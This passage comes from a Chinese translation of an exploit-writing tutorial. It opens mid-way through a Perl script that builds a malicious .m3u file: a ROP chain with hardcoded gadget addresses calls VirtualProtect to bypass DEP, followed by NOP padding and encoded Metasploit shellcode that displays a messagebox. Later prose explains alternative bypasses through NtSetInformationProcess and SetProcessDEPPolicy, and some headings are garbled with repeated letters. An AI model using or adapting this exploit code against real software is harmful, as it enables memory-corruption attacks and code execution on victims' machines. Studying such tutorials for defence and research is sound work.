$params=$params."XXXX"; #lpAddress (param2)
$params=$params."YYYY"; #Size (param3)
$params=$params."ZZZZ"; #flNewProtect (param4)
$params=$params.pack('V',0x10035005); #writeableaddress
$params=$params.("H"x8); #padding
#ADDESP,20+RETwilllandhere
#changeESIsoitpointstocorrectlocation
#towritefirstparameter(returnaddress)
my$rop2=pack('V',0x763C982F); #XCHGESI,EDI#DECECX#RETN4
#-----Makeeaxpointatshellcode--------------------------
$rop2=$rop2.pack('V',0x1002DC4C); #ADDEAX,100#POPEBP
$rop2=$rop2."AAAA";#padding-compensateforRETN4before
$rop2=$rop2."AAAA";#padding
#----------------------------------------------------------
#returnaddressisinEAX-writeparameter1
$rop2=$rop2.pack('V',0x77E84115);
$rop2=$rop2."AAAA";#padding
#EAXnowcontainsstackpointer
#saveitbacktoESIfirst
$rop2=$rop2.pack('V',0x775D131E); #PUSHEAX#POPESI#RETN
#-----Makeeaxpointatshellcode(again)--------------------------
$rop2=$rop2.pack('V',0x1002DC4C); #ADDEAX,100#POPEBP
$rop2=$rop2."AAAA";#padding
#increaseESIwith4
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
#andwritelpAddress(param2)
$rop2=$rop2.pack('V',0x77E84115);
$rop2=$rop2."AAAA";#padding
#saveEAXinESIagain
$rop2=$rop2.pack('V',0x775D131E); #PUSHEAX#POPESI#RETN
#createsize-setEAXto300orso
$rop2=$rop2.pack('V',0x100307A9); #XOREAX,EAX#RETN
$rop2=$rop2.pack('V',0x1002DC4C); #ADDEAX,100#POPEBP
$rop2=$rop2."AAAA";#padding
$rop2=$rop2.pack('V',0x1002DC4C); #ADDEAX,100#POPEBP
$rop2=$rop2."AAAA";#padding
$rop2=$rop2.pack('V',0x1002DC4C); #ADDEAX,100#POPEBP
$rop2=$rop2."AAAA";#padding
#writesize,firstsetESItorightplace
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
#write(param3)
$rop2=$rop2.pack('V',0x77E84115);
$rop2=$rop2."AAAA";#padding
#saveEAXinESIagain
$rop2=$rop2.pack('V',0x775D131E); #PUSHEAX#POPESI#RETN
#flNewProtect0x40
$rop2=$rop2.pack('V',0x10010C77); #XOREAX,EAX
$rop2=$rop2.pack('V',0x1002DC41); #ADDEAX,40#POPEBP
$rop2=$rop2."AAAA";#padding
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
#write(param4)
$rop2=$rop2.pack('V',0x77E84115);
$rop2=$rop2."AAAA";#padding
#ReturntoVirtualProtect()
#EAXpointsatVirtualProtectpointer(justbeforeparameters)
#compensateforthe2POPinstructions
$rop2=$rop2.pack('V',0x775D12F1); #SUBEAX,4#RET
$rop2=$rop2.pack('V',0x775D12F1); #SUBEAX,4#RET
#changeESP&flyback
$rop2=$rop2.pack('V',0x73DF5CA8); #[Module:MFC42.DLL]
#PUSHEAX#POPESP#MOVEAX,EDI#POPEDI#POPESI#RETN
#
my$nops="\x90"x240;
#
#./msfpayloadwindows/messagebox
# TITLE=CORELANTEXT="roptestbycorelanc0d3r"R
#|./msfencode-ex86/alpha_mixed-tperl
my$shellcode=
"\x89\xe0\xda\xcf\xd9\x70\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a".
"\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59".
"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41".
"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42".
"\x75\x4a\x49\x48\x59\x48\x6b\x4f\x6b\x48\x59\x43\x44\x51".
"\x34\x4c\x34\x50\x31\x48\x52\x4f\x42\x42\x5a\x46\x51\x49".
"\x59\x45\x34\x4e\x6b\x51\x61\x44\x70\x4e\x6b\x43\x46\x46".
"\x6c\x4c\x4b\x42\x56\x45\x4c\x4c\x4b\x42\x66\x43\x38\x4c".
"\x4b\x51\x6e\x45\x70\x4e\x6b\x50\x36\x44\x78\x42\x6f\x45".
"\x48\x44\x35\x4c\x33\x50\x59\x43\x31\x4a\x71\x4b\x4f\x48".
"\x61\x43\x50\x4c\x4b\x50\x6c\x51\x34\x46\x44\x4e\x6b\x47".
"\x35\x45\x6c\x4c\x4b\x42\x74\x43\x35\x42\x58\x46\x61\x48".
"\x6a\x4e\x6b\x51\x5a\x45\x48\x4e\x6b\x42\x7a\x47\x50\x47".
"\x71\x48\x6b\x4a\x43\x45\x67\x42\x69\x4e\x6b\x47\x44\x4e".
"\x6b\x46\x61\x48\x6e\x46\x51\x49\x6f\x45\x61\x49\x50\x49".
"\x6c\x4e\x4c\x4d\x54\x49\x50\x50\x74\x45\x5a\x4b\x71\x48".
"\x4f\x44\x4d\x47\x71\x4b\x77\x48\x69\x48\x71\x49\x6f\x49".
"\x6f\x4b\x4f\x45\x6b\x43\x4c\x47\x54\x44\x68\x51\x65\x49".
"\x4e\x4e\x6b\x50\x5a\x45\x74\x46\x61\x48\x6b\x50\x66\x4e".
"\x6b\x46\x6c\x50\x4b\x4c\x4b\x51\x4a\x45\x4c\x45\x51\x4a".
"\x4b\x4e\x6b\x43\x34\x4c\x4b\x43\x31\x4a\x48\x4d\x59\x42".
"\x64\x51\x34\x47\x6c\x45\x31\x4f\x33\x4f\x42\x47\x78\x44".
"\x69\x49\x44\x4f\x79\x4a\x45\x4e\x69\x4a\x62\x43\x58\x4e".
"\x6e\x42\x6e\x44\x4e\x48\x6c\x43\x62\x4a\x48\x4d\x4c\x4b".
"\x4f\x4b\x4f\x49\x6f\x4d\x59\x42\x65\x43\x34\x4f\x4b\x51".
"\x6e\x48\x58\x48\x62\x43\x43\x4e\x67\x47\x6c\x45\x74\x43".
"\x62\x49\x78\x4e\x6b\x4b\x4f\x4b\x4f\x49\x6f\x4f\x79\x50".
"\x45\x45\x58\x42\x48\x50\x6c\x42\x4c\x51\x30\x4b\x4f\x51".
"\x78\x50\x33\x44\x72\x44\x6e\x51\x74\x50\x68\x42\x55\x50".
"\x73\x42\x45\x42\x52\x4f\x78\x43\x6c\x47\x54\x44\x4a\x4c".
"\x49\x4d\x36\x50\x56\x4b\x4f\x43\x65\x47\x74\x4c\x49\x48".
"\x42\x42\x70\x4f\x4b\x49\x38\x4c\x62\x50\x4d\x4d\x6c\x4e".
"\x67\x45\x4c\x44\x64\x51\x42\x49\x78\x51\x4e\x49\x6f\x4b".
"\x4f\x49\x6f\x42\x48\x42\x6c\x43\x71\x42\x6e\x50\x58\x50".
"\x68\x47\x33\x42\x6f\x50\x52\x43\x75\x45\x61\x4b\x6b\x4e".
"\x68\x51\x4c\x47\x54\x47\x77\x4d\x59\x4b\x53\x50\x68\x51".
"\x48\x47\x50\x51\x30\x51\x30\x42\x48\x50\x30\x51\x74\x50".
"\x33\x50\x72\x45\x38\x42\x4c\x45\x31\x50\x6e\x51\x73\x43".
"\x58\x50\x63\x50\x6f\x43\x42\x50\x65\x42\x48\x47\x50\x43".
"\x52\x43\x49\x51\x30\x51\x78\x43\x44\x42\x45\x51\x63\x50".
"\x74\x45\x38\x44\x32\x50\x6f\x42\x50\x51\x30\x46\x51\x48".
"\x49\x4c\x48\x42\x6c\x47\x54\x44\x58\x4d\x59\x4b\x51\x46".
"\x51\x48\x52\x51\x42\x46\x33\x50\x51\x43\x62\x49\x6f\x4e".
"\x30\x44\x71\x49\x50\x50\x50\x4b\x4f\x50\x55\x45\x58\x45".
"\x5a\x41\x41";
my$rest="C"x300;
my$payload=$junk.$eip.$junk2.$rop.$params.$rop2.$nops.$shellcode.$rest;
print"Payloadsize:".length($payload)."\n";
print"Shellcodesize:".length($shellcode)."\n";
open($FILE,">$file");
print$FILE$payload;
close($FILE);
print"m3uFile$fileCreatedsuccessfully\n";
结果：
DDDDiiiirrrreeeecccctttt RRRREEEETTTT--------RRRROOOOPPPP 版本 2222--------NNNNttttSSSSeeeettttIIIInnnnffffoooorrrrmmmmaaaattttiiiioooonnnnPPPPrrrroooocccceeeessssssss(((())))
让我们用相同的程序来测试下一种不同的ROP绕过技术：NtSetInformationProcess()
这个函数有5个参数：
返回地址 要产生的值，指向函数需要返回的地方（=你的shellcode在的位置）
NtCurrentProcess() 静态值，设成0xFFFFFFFF
ProcessExecuteFlags() 静态值，设成0x22
&ExecuteFlags 指向0x00000002，可能是你的exploit硬编码的静态地址，但是必须
是可写的
sizeOf（ExecuteFlags） 静态值，设成0x4
exploitrop的布局将会和VirtualProtect()看起来一样：
●保存栈位置
●跳过占位符
●产生返回地址的值
○eax清零：XOR EAX，EAX+RET：0x100307A9
○ADDEAX，40+RET：0x1002DC41+指向ADDEAX，-2的链直到它包含0x22（0x10027D2E）
○或者，用ADD AL，10（0x100308FD）两次然后INC EAX两次（0x1001152C）
●如果需要的话，为第三个参数产生值（指向0x2，可写地址）。提示：试着在Immunity
Debugger中运行“!pvefindaddr find 02000000 rw”然后看你是否能找到一个静态/可写
的地址
●为第四个参数（0x4）产生值然后用“ESI+0x10”来将它写入栈上
○inc eax 4次：0x1001152C
好练习。
只要证明它能成功：
DDDDiiiirrrreeeecccctttt RRRREEEETTTT--------RRRROOOOPPPP 版本 3333--------SSSSeeeettttPPPPrrrroooocccceeeessssssssDDDDEEEEPPPPPPPPoooolllliiiiccccyyyy(((())))
另一种绕过DEP的方法是用SetProcessDEPPolicy()，关掉进程的DEP。
这个函数需要在栈上有两个参数：一个指向shellcode的指针（动态产生的），和0。
由于我们只有有限数量的参数，我会试着用一种不同的技术来将参数入栈...PUSHAD
一个pushad指令会将寄存器入栈。当寄存器入栈后，这是栈顶的情况：
●EDI
●ESI
●EBP
●指向这个块后面栈的值
●EBX
●EDX
●ECX
●EAX
这意味着，如果我们将nop/shellcode放在这个块的后面，那么我们可以利用我们将有一个
在栈上自动魔法般地指向我们的shellcode的值的事实。
接下来，pushad将返回到栈顶（可以用EDI操作的值）。因此给我们提供了使它成功的完美
路径。
为了将正确的参数放在正确的位置上，我们不得不用下面的值来精巧布置寄存器：
●EDI=指向RET的指针（滑到下一个指令：rop nop）
●ESI=指向RET的指针（滑到下一个指令：rop nop）
●EBP=指向SetProcessDEPPolicy()的指针
●EBX=指向0
●EDX，ECX和EAX都不要紧
在pushad之后，栈是这样的：
●RET（从EDI取出）
●RET（从ESI取出）
●SetProcessDEPPolicy()（从EBP中取出）
●指向shellcode的指针（通过pushad自动插入）
●0（从EBX取出）
●EDX（废物）
●ECX（废物）
●EAX（废物）
●nop
●shellcode
做这个的rop链是这样的：
（只要附加上nop+shellcode到这个rop链然后你就完工了）
结果：
DirectRET--ROP 版本4--ret-to-libc：WinExec()
到目前为止，我已经解释了一些用特定Windows函数绕过DEP的方法。每一个例子中，技
术后面的真正挑战是找到一个可靠的精巧布置栈的ROP小配件然后调用函数。
我觉得注意一个典型的ret-to-libc-style方法（如用WinExec()）是很重要的，这方法也可能